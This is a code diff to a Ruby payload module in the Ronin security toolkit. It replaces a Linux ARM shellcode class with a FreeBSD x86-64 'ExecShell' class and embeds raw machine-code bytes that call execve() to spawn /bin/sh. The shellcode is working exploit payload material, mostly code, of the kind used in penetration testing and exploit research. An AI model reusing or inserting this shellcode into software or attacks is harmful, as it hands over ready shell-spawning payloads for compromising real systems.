@@ -24,43 +24,36 @@ require 'ronin/payloads/shellcode_payload'
 module Ronin
   module Payloads
     module Shellcode
-      module Linux
-        module ARM
+      module FreeBSD
+        module X86_64
           #
-          # Linux ARM shellcode that calls `execve()` with `/bin/sh`.
+          # FreeBSD x86-64 shellcode that calls `execve()` with `/bin/sh`.
           #
-          class Execve < ShellcodePayload
+          class ExecShell < ShellcodePayload
 
-            register 'shellcode/linux/arm/execve'
+            register 'shellcode/freebsd/x86_64/exec_shell'
 
-            arch :arm
-            os :linux
+            arch :x86_64
+            os :freebsd
 
-            author "Jonathan 'dummys' Borgeaud", twitter: 'dummys1337',
-                                                 website: 'fapperz.org'
+            author 'Gitsnik'
 
-            summary 'Linux ARM execve() shellcode'
+            summary 'FreeBSD x86-64 execve() shellcode'
             description <<~DESC
-            Linux ARM shellcode that calls execve() with "/bin/sh".
+            FreeBSD x86-64 shellcode that calls execve() with "/bin/sh".
             DESC
 
             references [
-              "https://shell-storm.org/shellcode/files/shellcode-904.html"
+              "https://shell-storm.org/shellcode/files/shellcode-866.html"
             ]
 
             #
             # Builds the shellcode.
             #
             def build
-              @payload = "\x01\x30\x8f\xe2" \
-                         "\x13\xff\x2f\xe1" \
-                         "\x78\x46\x0e\x30" \
-                         "\x01\x90\x49\x1a" \
-                         "\x92\x1a\x08\x27" \
-                         "\xc2\x51\x03\x37" \
-                         "\x01\xdf\x2f\x62" \
-                         "\x69\x6e\x2f\x2f" \
-                         "\x73\x68".b
+              @payload = "\x48\x31\xc9\x48\xf7\xe1\x04\x3b\x48\xbb" \
+                         "\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53" \
+                         "\x54\x5f\x52\x57\x54\x5e\x0f\x05".b
             end
 
           end
